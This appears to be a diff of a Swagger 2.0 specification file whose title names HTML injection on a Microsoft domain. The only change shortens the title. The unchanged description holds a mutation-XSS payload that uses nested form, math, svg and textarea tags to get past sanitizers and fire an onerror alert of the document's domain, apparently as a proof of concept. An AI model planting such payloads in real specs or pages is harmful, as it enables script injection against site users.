@@ -1,6 +1,6 @@
 swagger: '2.0'
 info:
-  title: HTML INJECTION ON MICROSOFT DOMAIN BY RAJNISH
+  title: HTML INJECTION ON MICROSOFT
   description: |
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src=1>"></form>
 
